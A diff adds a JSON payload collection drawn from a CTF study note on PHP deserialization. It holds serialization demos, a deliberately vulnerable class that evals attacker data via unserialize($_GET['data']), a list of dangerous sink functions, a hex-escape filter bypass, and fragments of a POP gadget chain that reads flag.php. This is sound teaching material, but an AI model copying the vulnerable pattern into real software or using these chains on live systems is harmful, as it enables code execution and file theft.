@@ -1,0 +1,98 @@
+{
+  "id": "payload-php_unserialize-001",
+  "type": "payload",
+  "category": "deserialize",
+  "subcategory": "php_unserialize",
+  "name": "PHP反序列化漏洞总结 Payload 集合",
+  "description": "从 PHP反序列化漏洞总结.md 提取的实战 Payload",
+  "payloads": [
+    {
+      "payload": "<?php\r\nclass Person\r\n{\r\n    public $name;\r\n    public function eat()\r\n    {\r\n        echo $this->name . \" eat something...\" . \"<br>\";\r\n    }\r\n    public function sleep()\r\n    {\r\n        echo $this->name . \" sleeping...\" . \"<br>\";\r\n    }\r\n    public function __construct($name)\r\n    {\r\n        $this->name = $name;\r\n    }\r\n}\r\n\r\n$person = new Person(\"Zhangsan\");\r\n$person->eat();\r\n$person->sleep();",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "Zhangsan eat something...\r\nZhangsan sleeping...",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "<?php\r\nclass Obj\r\n{\r\n    public $property1 = 'ppt1';\r\n    private $property2 = 'ppt2';\r\n    protected $property3 = 'ppt3';\r\n\r\n    function func()\r\n    {\r\n    }\r\n}\r\n\r\n$o = new Obj();\r\necho serialize($o);",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "O:3:\"Obj\":3:{s:9:\"property1\";s:4:\"ppt1\";s:14:\"Objproperty2\";s:4:\"ppt2\";s:12:\"*property3\";s:4:\"ppt3\";}",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "O%3A3%3A%22Obj%22%3A3%3A%7Bs%3A9%3A%22property1%22%3Bs%3A4%3A%22ppt1%22%3Bs%3A14%3A%22%00Obj%00property2%22%3Bs%3A4%3A%22ppt2%22%3Bs%3A12%3A%22%00%2A%00property3%22%3Bs%3A4%3A%22ppt3%22%3B%7D",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "O:3:\"Obj\":3:{s:9:\"property1\";s:4:\"ppt1\";s:14:\"%00Obj%00property2\";s:4:\"ppt2\";s:12:\"%00*%00property3\";s:4:\"ppt3\";}",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "$data = urldecode('O:3:\"Obj\":3:{s:9:\"property1\";s:4:\"ppt1\";s:14:\"%00Obj%00property2\";s:4:\"ppt2\";s:12:\"%00*%00property3\";s:4:\"ppt3\";}');\r\nvar_dump(unserialize($data));",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "<?php\r\n\r\nclass Evil\r\n{\r\n    var $code = 'echo \"Hello World!\";';\r\n    function __destruct()\r\n    {\r\n        @eval($this->code);\r\n    }\r\n}\r\n\r\n$obj = unserialize($_GET['data']);",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "命令执行：exec()、passthru()、popen()、system()\r\n文件操作：file_put_contents()、file_get_contents()、unlink()\r\n代码执行：eval()、assert()、call_user_func()",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "s:4:\"user\";\r\n// equal\r\nS:4:\"use\\72\";",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "Show::__wakeup ==> Show::__toString ==> Test::__get ==> Read::__invoke",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "class Read\r\n{\r\n    public $var;\r\n}\r\n\r\nclass Show\r\n{\r\n    public $source;\r\n    public $str;\r\n}\r\n\r\nclass Test\r\n{\r\n    public $p;\r\n}\r\n\r\n$show = new Show();\r\n$show2 = new Show();\r\n$test = new Test();\r\n$read = new Read();",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "$show->source = $show2;\r\n$show2->str = array('str' => $test);",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "$test->p = $read;",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    },
+    {
+      "payload": "$read->var = 'flag.php';",
+      "context": "PHP反序列化",
+      "source": "PHP反序列化漏洞总结.md"
+    }
+  ],
+  "related_theory": [
+    "theory-php-deserialize-001"
+  ],
+  "related_pocs": [],
+  "tags": [
+    "PHP反序列化",
+    "unserialize",
+    "反序列化链",
+    "deserialize"
+  ],
+  "severity": "high",
+  "source": "Des-CTF-Knowledge/PHP反序列化漏洞总结.md",
+  "last_updated": "2026-10-22"
+}
